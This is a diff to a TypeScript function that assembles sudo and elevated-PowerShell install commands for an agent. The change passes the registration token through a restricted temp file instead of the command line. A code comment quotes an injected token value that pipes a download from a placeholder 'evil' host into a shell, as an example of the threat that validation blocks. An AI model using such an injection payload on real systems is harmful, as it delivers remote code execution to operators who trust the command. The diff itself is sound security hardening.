@@ -156,16 +156,18 @@ export function isSecureControllerOrigin(origin: string): boolean {
 
 // Binary name mirrors installerFilename and the sudo prefix mirrors readmeText
 // (both in handlers_installer.go). The subcommand and flag names come from
-// buildInstallCommand in cmd/steward/main.go — `install --regtoken
+// buildInstallCommand in cmd/steward/main.go — `install --regtoken-file
 // --controller-url`, not `--token`/`--controller`, which the packaged
-// README.txt does not spell out.
+// README.txt does not spell out. The token never appears in a process argument
+// list: it reaches a root/admin-only temp file through shell builtins, and the
+// steward reads it from there.
 //
 // Every interpolated segment is validated here rather than relying on the caller:
 // the output is presented to operators as a root (`sudo`) one-liner, so an
 // unvalidated token such as `abcd; curl http://evil/x | sh` would turn this page
 // into an RCE delivery vehicle vouched for by the controller UI. The function
 // refuses to build a command it cannot vouch for instead of emitting a partially
-// trusted string. The POSIX token is additionally single-quoted so the charset
+// trusted string. The token is single-quoted in both shells so the charset
 // check is not the only thing standing between the operator and a shell.
 export function assembleCommand(platform: string, arch: string, token: string): string {
   if (!(PLATFORMS as readonly string[]).includes(platform)) {
@@ -185,12 +187,27 @@ export function assembleCommand(platform: string, arch: string, token: string): 
     )
   }
   if (platform === 'windows') {
-    // Not quoted: single quotes are literal in cmd.exe (the exe would receive
-    // them as part of the value) while PowerShell strips them. The charset check
-    // above already excludes every cmd.exe and PowerShell metacharacter.
-    return `.\\cfgms-steward-${arch}.exe install --regtoken ${token} --controller-url ${origin}`
+    // Run in an elevated PowerShell. The ACL is restricted to SYSTEM and
+    // BUILTIN\Administrators (the only principals the steward's Windows token
+    // file check accepts) before the token is written.
+    return (
+      `$f = Join-Path $env:TEMP 'cfgms-regtoken'; ` +
+      `New-Item -ItemType File -Path $f -Force | Out-Null; ` +
+      `icacls $f /inheritance:r /grant:r '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null; ` +
+      `Set-Content -LiteralPath $f -Value '${token}' -NoNewline; ` +
+      `.\\cfgms-steward-${arch}.exe install --regtoken-file $f --controller-url ${origin}; ` +
+      `Remove-Item -LiteralPath $f -Force`
+    )
   }
-  return `sudo ./cfgms-steward-${arch} install --regtoken '${token}' --controller-url ${origin}`
+  // `sudo mktemp` creates a root-owned 0600 file, which is what the steward's
+  // token file check requires. printf and tee are fed the token through a pipe,
+  // not an argument list the steward sees.
+  return (
+    `CFGMS_TOKEN_FILE=$(sudo mktemp) && ` +
+    `printf '%s' '${token}' | sudo tee "$CFGMS_TOKEN_FILE" >/dev/null && ` +
+    `sudo ./cfgms-steward-${arch} install --regtoken-file "$CFGMS_TOKEN_FILE" --controller-url ${origin}; ` +
+    `sudo rm -f "$CFGMS_TOKEN_FILE"`
+  )
 }
 
 // ── Sub-components ─────────────────────────────────────────────────────────────
